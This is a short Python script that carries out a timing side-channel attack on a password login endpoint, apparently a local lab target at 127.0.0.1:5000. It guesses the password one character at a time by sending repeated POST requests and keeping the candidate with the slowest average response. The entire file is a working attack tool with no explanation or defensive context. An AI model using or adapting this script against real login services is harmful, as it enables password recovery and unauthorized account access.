from string import ascii_uppercase, ascii_lowercase, digits
from time import perf_counter
from requests import post

url = "http://127.0.0.1:5000/login"
abc = ascii_uppercase + ascii_lowercase + digits
pwd = ""
n = 6

for pos in range(n):
    best = ""
    best_t = -1

    for c in abc:
        test = pwd + c + "A" * (n - len(pwd) - 1)
        t = 0

        for q in range(20):
            s = perf_counter()
            post(url, json={"password": test})
            t += perf_counter() - s

        t /= 20
        print(f"{test}: {t:.6f}")

        if t > best_t:
            best_t = t
            best = c
            
    pwd += best
    print("->", pwd)

print("FOUND:", pwd)
